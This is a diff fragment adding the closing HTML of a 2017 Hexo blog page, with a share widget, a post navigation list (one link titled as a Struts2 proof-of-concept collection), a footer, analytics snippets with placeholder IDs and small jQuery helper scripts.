+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2017/08/15/hexo+github+nginx VPS搭建博客/" title="上一篇: hexo+github+nginx vps搭建博客">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/hexo+github+nginx VPS搭建博客/">hexo+github+nginx vps搭建博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/Strut2 常见POC/">Struts2 常见POC收集</a></li></ul>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 cmustard
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
